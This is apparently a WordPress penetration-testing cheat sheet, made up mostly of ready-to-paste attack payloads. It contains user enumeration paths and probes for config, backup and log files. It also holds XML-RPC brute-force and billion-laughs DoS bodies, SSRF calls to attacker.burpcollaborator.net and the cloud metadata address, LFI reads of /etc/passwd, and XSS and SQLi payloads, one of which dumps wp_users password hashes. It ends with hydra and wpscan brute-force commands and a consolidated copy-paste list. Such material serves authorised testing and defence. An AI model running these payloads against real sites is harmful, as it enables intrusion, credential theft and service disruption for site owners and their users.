# WORDPRESS PENETRATION TESTING PAYLOADS COMPLETE CHEAT SHEET

## 1. WHAT IS WORDPRESS?

**WordPress** is the most widely used Content Management System (CMS) in the world, powering over 40% of all websites. Its popularity makes it a prime target for attackers. Common vulnerabilities include:

- **User enumeration** (exposing valid usernames)
- **Brute force attacks** via `wp-login.php` and `xmlrpc.php`
- **Vulnerable plugins and themes** (outdated or abandoned)
- **Misconfigured REST API** (unauthenticated data exposure)
- **Exposed sensitive files** (`wp-config.php`, backups, debug logs)
- **SQL injection, XSS, LFI, RCE** via plugins/themes

**Key fact:** Most WordPress compromises originate from outdated plugins and themes, not core vulnerabilities.

---

## 2. WORDPRESS ENUMERATION

### 2.1 User Enumeration

**Method 1: Author ID Enumeration**
```
/?author=1
/?author=2
/?author=3
/?author=4
/?author=5
/?author=10
```
Redirects to `/?author=1` reveal the username slug (e.g., `/author/admin/`).

**Method 2: REST API User Enumeration**
```
/wp-json/wp/v2/users
/wp-json/wp/v2/users/1
/wp-json/wp/v2/users/2
/wp-json/wp/v2/users?per_page=100
```

**Method 3: Sitemap Enumeration**
```
/wp-sitemap.xml
/wp-sitemap-users-1.xml
```

**Method 4: Login Error Messages**
```
POST /wp-login.php
log=admin&pwd=wrong
```
If the response differs for valid vs invalid usernames, enumeration is possible.

**Method 5: RSS Feed Enumeration**
```
/feed/
/?feed=rss2
```

**Method 6: oEmbed Enumeration**
```
/wp-json/oembed/1.0/embed?url=http://target.com/
```

### 2.2 Plugin and Theme Enumeration

```
/wp-content/plugins/
/wp-content/themes/
/wp-content/plugins/akismet/
/wp-content/plugins/contact-form-7/
/wp-content/plugins/woocommerce/
/wp-content/plugins/elementor/
/wp-content/plugins/wordpress-seo/
/wp-content/themes/twentytwenty/
/wp-content/themes/twentytwentyone/
/wp-content/themes/astra/
/wp-content/themes/generatepress/
```

### 2.3 Version Enumeration

```
/?ver=1.2.3
/wp-includes/js/wp-embed.min.js?ver=5.8.1
/wp-content/themes/twentytwenty/style.css?ver=1.0
/feed/
```
Look for `<generator>https://wordpress.org/?v=X.X.X</generator>` in the response.

---

## 3. SENSITIVE FILE DISCLOSURE

### 3.1 Configuration Files

```
/wp-config.php
/wp-config.php.bak
/wp-config.php.old
/wp-config.php.save
/wp-config.php~
/wp-config.php.swp
/wp-config.php.txt
/wp-config.php.disabled
/wp-config.php.orig
/wp-config.php.copy
/wp-config.php.1
/wp-config.php.2
/wp-config.php.backup
/.user.ini
/.htaccess
```

### 3.2 Backup Files

```
/wp-content/backup-db/
/wp-content/backups/
/wp-content/updraft/
/wp-content/uploads/backup/
/wp-content/uploads/backups/
/wp-content/uploads/wpvivid/
/wp-content/uploads/jetbackup/
/backup/
/backups/
/wordpress.zip
/wordpress.tar.gz
/site.zip
/site.tar.gz
/db.sql
/database.sql
/backup.sql
/wordpress.sql
```

### 3.3 Log Files

```
/wp-content/debug.log
/wp-content/uploads/debug.log
/wp-content/uploads/api-debug.log
/wp-content/error_log
/error_log
/debug.log
```

### 3.4 Other Sensitive Files

```
/readme.html
/license.txt
/xmlrpc.php
/wp-cron.php
/wp-admin/install.php
/wp-admin/setup-config.php
/wp-admin/upgrade.php
/wp-links-opml.php
/wp-trackback.php
/wp-json/
/wp-json/wp/v2/
```

---

## 4. XML-RPC ATTACKS

### 4.1 XML-RPC Pingback Detection
```
POST /xmlrpc.php
```
Body:
```
<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>
```

### 4.2 XML-RPC Brute Force (system.multicall)
```
POST /xmlrpc.php
```
Body:
```
<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>admin</string></value><value><string>password1</string></value></data></array></value></member></struct></value><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>admin</string></value><value><string>password2</string></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>
```

### 4.3 XML-RPC SSRF (Pingback)
```
POST /xmlrpc.php
```
Body:
```
<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://attacker.burpcollaborator.net/</string></value></param><param><value><string>http://target.com/</string></value></param></params></methodCall>
```

### 4.4 XML-RPC DoS (Billion Laughs)
```
<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>
```

---

## 5. REST API VULNERABILITIES

### 5.1 User Enumeration
```
GET /wp-json/wp/v2/users
GET /wp-json/wp/v2/users?per_page=100
GET /wp-json/wp/v2/users/1
```

### 5.2 Post/Page Enumeration
```
GET /wp-json/wp/v2/posts
GET /wp-json/wp/v2/posts?per_page=100
GET /wp-json/wp/v2/pages
GET /wp-json/wp/v2/pages?per_page=100
```

### 5.3 Draft Content Exposure
```
GET /wp-json/wp/v2/posts?status=draft
GET /wp-json/wp/v2/pages?status=draft
```

### 5.4 Batch Endpoint (SQLi)
```
POST /wp-json/batch/v1
Content-Type: application/json

{"validation":"normal","requests":[{"path":":","method":"POST"},{"path":"/wp/v2/categories","method":"POST","body":{"name":"x","requests":[{"path":":","method":"GET"},{"path":"/wp/v2/categories?author_exclude=1","method":"GET"},{"path":"/wp/v2/posts","method":"GET"}]}},{"path":"/batch/v1","method":"POST"}]}
```

**Time-based SQLi payload in `author_exclude`:**
```
1) OR SLEEP(5)-- -
```

### 5.5 oEmbed Proxy SSRF
```
GET /wp-json/oembed/1.0/proxy?url=http://169.254.169.254/latest/meta-data/
GET /wp-json/oembed/1.0/proxy?url=http://attacker.burpcollaborator.net/
```

### 5.6 REST API Route Discovery
```
/wp-json/
/wp-json/wp/v2/
/wp-json/wp/v2/pages
/wp-json/wp/v2/media
/wp-json/wp/v2/comments
/wp-json/wp/v2/tags
/wp-json/wp/v2/categories
/wp-json/wp/v2/taxonomies
/wp-json/wp/v2/types
/wp-json/wp/v2/statuses
/wp-json/wp/v2/settings
/wp-json/wp/v2/themes
/wp-json/wp/v2/plugins
```

---

## 6. BRUTE FORCE

### 6.1 wp-login.php
```
POST /wp-login.php
log=admin&pwd=password&wp-submit=Log+In&redirect_to=/wp-admin/&testcookie=1
```

### 6.2 xmlrpc.php (system.multicall)
```
POST /xmlrpc.php
```
Body (single attempt):
```
<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value></param><param><value><string>password</string></value></param></params></methodCall>
```

### 6.3 Common Usernames
```
admin
administrator
root
user
test
guest
editor
author
wp-admin
wordpress
demo
info
support
webmaster
```

### 6.4 Common Passwords
```
admin
password
123456
12345678
qwerty
letmein
welcome
monkey
dragon
master
shadow
football
baseball
```

---

## 7. LFI / XSS / SQLI IN WORDPRESS

### 7.1 LFI Payloads
```
/wp-content/plugins/PLUGIN/file.php?file=../../../../etc/passwd
/wp-content/plugins/PLUGIN/file.php?file=php://filter/convert.base64-encode/resource=index.php
/wp-content/themes/THEME/functions.php?file=../../../../etc/passwd
/wp-admin/admin-ajax.php?action=PLUGIN_ACTION&file=../../../../etc/passwd
```

### 7.2 XSS Payloads
```
/wp-admin/admin-ajax.php?action=PLUGIN_ACTION&param=<script>alert(1)</script>
/?s=<script>alert(1)</script>
/?p=<img src=x onerror=alert(1)>
/?cat=<svg onload=alert(1)>
```

### 7.3 SQLi Payloads
```
/wp-admin/admin-ajax.php?action=PLUGIN_ACTION&id=1' OR '1'='1
/wp-admin/admin-ajax.php?action=PLUGIN_ACTION&id=1' UNION SELECT user_login,user_pass FROM wp_users-- -
/?s=1' OR SLEEP(5)-- -
/wp-json/wp/v2/posts?search=1' OR SLEEP(5)-- -
```

### 7.4 Common Vulnerable Parameters
```
id
user_id
post_id
cat
category
tag
author
s
search
orderby
order
file
path
url
redirect
callback
action
```

---

## 8. WPSCAN COMMANDS

### 8.1 Basic Scans
```bash
wpscan --url http://target.com
wpscan --url http://target.com -e u
wpscan --url http://target.com -e vp
wpscan --url http://target.com -e ap
wpscan --url http://target.com -e at
wpscan --url http://target.com -e vt
wpscan --url http://target.com -e u,p,t,vp,vt,ap,at
wpscan --url http://target.com -e bf
```

### 8.2 Enumeration Options
```bash
-e u       # Users
-e p       # Popular plugins
-e ap      # All plugins
-e vp      # Vulnerable plugins
-e t       # Popular themes
-e at      # All themes
-e vt      # Vulnerable themes
-e bf      # Backup folders
-e cb      # Config backups
-e dbe     # Database exports
-e u1-20   # Users from ID 1 to 20
```

### 8.3 Brute Force with WPScan
```bash
wpscan --url http://target.com -U admin -P wordlist.txt
wpscan --url http://target.com -U users.txt -P passwords.txt
wpscan --url http://target.com -U admin -P wordlist.txt --max-retries 3
wpscan --url http://target.com -U admin -P wordlist.txt --wordlist-skip 5000
```

### 8.4 Authentication-Based Scanning
```bash
wpscan --url http://target.com --wp-auth admin:"xxxxxxx"
```

### 8.5 JSONL Real-Time Output
```bash
wpscan --url http://target.com -e ap --format jsonl | jq .
```

### 8.6 WPScan API Token
```bash
wpscan --url http://target.com --api-token YOUR_API_TOKEN
```

---

## 9. OTHER TOOLS

| Tool | Usage |
|------|-------|
| **WPScan** | Comprehensive WordPress vulnerability scanner. |
| **Nuclei** | Template-based vulnerability scanner with WordPress templates. |
| **WPSeku** | WordPress vulnerability scanner. |
| **WPForce** | WordPress brute force tool. |
| **WPScan API** | Vulnerability database. |
| **Metasploit** | WordPress exploit modules. |
| **Burp Suite** | Manual testing and Intruder for brute force. |
| **Hydra** | Brute force for wp-login.php and xmlrpc.php. |
| **sqlmap** | Automated SQL injection. |
| **ffuf** | Directory and file fuzzing. |

### Hydra Examples
```bash
hydra -L users.txt -P passwords.txt target.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"
hydra -L users.txt -P passwords.txt target.com http-post-form "/xmlrpc.php:<?xml version=\"1.0\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>^USER^</string></value></param><param><value><string>^PASS^</string></value></param></params></methodCall>:F=Incorrect username or password"
```

### Nuclei WordPress Templates
```bash
nuclei -u http://target.com -t http/vulnerabilities/wordpress/
nuclei -u http://target.com -tags wordpress
```

---

## 10. TIPS FOR TESTING

1. Start with **WPScan** to enumerate users, plugins, and themes.
2. Check `/wp-json/wp/v2/users` for user enumeration.
3. Look for exposed backup files and `wp-config.php` backups.
4. Test `xmlrpc.php` for brute force and SSRF.
5. Check for debug logs (`/wp-content/debug.log`).
6. Enumerate plugins and check versions against the WPScan vulnerability database.
7. Test REST API endpoints for unauthenticated data exposure.
8. Use `--wp-auth` with WPScan for authenticated scans.
9. Brute force with `wp-login.php` or `xmlrpc.php` if credentials are weak.
10. Check for known CVEs in outdated plugins/themes.
11. Test for SQLi/XSS/LFI in plugin parameters.
12. Always test on your own WordPress installation first.

---

## 11. ALL IN ONE JUST FOR COPY PASTE AND USE IN A TXT FILE

```
/?author=1
/?author=2
/?author=3
/?author=4
/?author=5
/?author=10
/wp-json/wp/v2/users
/wp-json/wp/v2/users/1
/wp-json/wp/v2/users/2
/wp-json/wp/v2/users?per_page=100
/wp-sitemap.xml
/wp-sitemap-users-1.xml
/feed/
/?feed=rss2
/wp-json/oembed/1.0/embed?url=http://target.com/
/wp-content/plugins/
/wp-content/themes/
/wp-content/plugins/akismet/
/wp-content/plugins/contact-form-7/
/wp-content/plugins/woocommerce/
/wp-content/plugins/elementor/
/wp-content/plugins/wordpress-seo/
/wp-content/themes/twentytwenty/
/wp-content/themes/twentytwentyone/
/wp-content/themes/astra/
/wp-content/themes/generatepress/
/?ver=1.2.3
/wp-includes/js/wp-embed.min.js?ver=5.8.1
/wp-content/themes/twentytwenty/style.css?ver=1.0
/wp-config.php
/wp-config.php.bak
/wp-config.php.old
/wp-config.php.save
/wp-config.php~
/wp-config.php.swp
/wp-config.php.txt
/wp-config.php.disabled
/wp-config.php.orig
/wp-config.php.copy
/wp-config.php.1
/wp-config.php.2
/wp-config.php.backup
/.user.ini
/.htaccess
/wp-content/backup-db/
/wp-content/backups/
/wp-content/updraft/
/wp-content/uploads/backup/
/wp-content/uploads/backups/
/wp-content/uploads/wpvivid/
/wp-content/uploads/jetbackup/
/backup/
/backups/
/wordpress.zip
/wordpress.tar.gz
/site.zip
/site.tar.gz
/db.sql
/database.sql
/backup.sql
/wordpress.sql
/wp-content/debug.log
/wp-content/uploads/debug.log
/wp-content/uploads/api-debug.log
/wp-content/error_log
/error_log
/debug.log
/readme.html
/license.txt
/xmlrpc.php
/wp-cron.php
/wp-admin/install.php
/wp-admin/setup-config.php
/wp-admin/upgrade.php
/wp-links-opml.php
/wp-trackback.php
/wp-json/
/wp-json/wp/v2/
/wp-json/wp/v2/pages
/wp-json/wp/v2/media
/wp-json/wp/v2/comments
/wp-json/wp/v2/tags
/wp-json/wp/v2/categories
/wp-json/wp/v2/taxonomies
/wp-json/wp/v2/types
/wp-json/wp/v2/statuses
/wp-json/wp/v2/settings
/wp-json/wp/v2/themes
/wp-json/wp/v2/plugins
/wp-json/wp/v2/posts
/wp-json/wp/v2/posts?per_page=100
/wp-json/wp/v2/posts?status=draft
/wp-json/wp/v2/pages?status=draft
/wp-json/oembed/1.0/proxy?url=http://169.254.169.254/latest/meta-data/
/wp-json/oembed/1.0/proxy?url=http://attacker.burpcollaborator.net/
/wp-json/batch/v1
<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>
<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value></param><param><value><string>password</string></value></param></params></methodCall>
<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://attacker.burpcollaborator.net/</string></value></param><param><value><string>http://target.com/</string></value></param></params></methodCall>
<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>
log=admin&pwd=password&wp-submit=Log+In&redirect_to=/wp-admin/&testcookie=1
/wp-content/plugins/PLUGIN/file.php?file=../../../../etc/passwd
/wp-content/plugins/PLUGIN/file.php?file=php://filter/convert.base64-encode/resource=index.php
/wp-content/themes/THEME/functions.php?file=../../../../etc/passwd
/wp-admin/admin-ajax.php?action=PLUGIN_ACTION&file=../../../../etc/passwd
/wp-admin/admin-ajax.php?action=PLUGIN_ACTION&param=<script>alert(1)</script>
/?s=<script>alert(1)</script>
/?p=<img src=x onerror=alert(1)>
/?cat=<svg onload=alert(1)>
/wp-admin/admin-ajax.php?action=PLUGIN_ACTION&id=1' OR '1'='1
/wp-admin/admin-ajax.php?action=PLUGIN_ACTION&id=1' UNION SELECT user_login,user_pass FROM wp_users-- -
/?s=1' OR SLEEP(5)-- -
/wp-json/wp/v2/posts?search=1' OR SLEEP(5)-- -
wpscan --url http://target.com
wpscan --url http://target.com -e u
wpscan --url http://target.com -e vp
wpscan --url http://target.com -e ap
wpscan --url http://target.com -e at
wpscan --url http://target.com -e vt
wpscan --url http://target.com -e u,p,t,vp,vt,ap,at
wpscan --url http://target.com -e bf
wpscan --url http://target.com -U admin -P wordlist.txt
wpscan --url http://target.com -U users.txt -P passwords.txt
wpscan --url http://target.com --wp-auth admin:"xxxxxxx"
wpscan --url http://target.com -e ap --format jsonl | jq .
wpscan --url http://target.com --api-token YOUR_API_TOKEN
hydra -L users.txt -P passwords.txt target.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"
hydra -L users.txt -P passwords.txt target.com http-post-form "/xmlrpc.php:<?xml version=\"1.0\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>^USER^</string></value></param><param><value><string>^PASS^</string></value></param></params></methodCall>:F=Incorrect username or password"
nuclei -u http://target.com -t http/vulnerabilities/wordpress/
nuclei -u http://target.com -tags wordpress
```
